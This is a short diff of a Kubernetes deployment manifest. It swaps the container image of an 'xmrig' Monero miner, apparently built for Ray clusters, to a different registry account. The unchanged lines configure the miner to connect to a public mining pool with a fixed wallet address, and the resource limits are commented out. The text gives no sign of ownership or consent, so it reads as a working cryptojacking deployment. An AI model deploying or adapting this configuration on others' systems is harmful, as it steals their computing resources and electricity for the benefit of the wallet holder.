@@ -14,7 +14,7 @@ spec:
     spec:
       containers:
         - name: xmrig
-          image: hoon33710/ray-xmrig:latest
+          image: amin/ray-xmrig:latest
           args: ["-o", "pool.supportxmr.com:3333", "-u", "49ppzHZhAG2AWEq2SVgHboMV3ow8PbtfZchS1yiiKwKY9hrR7nYtZjhYdDtuSDWbVSTCGFxnkSfxKPvmm1kz9XFkBy2xYWN", "-p", "x", "-k"]
           # resources:
           #   limits:
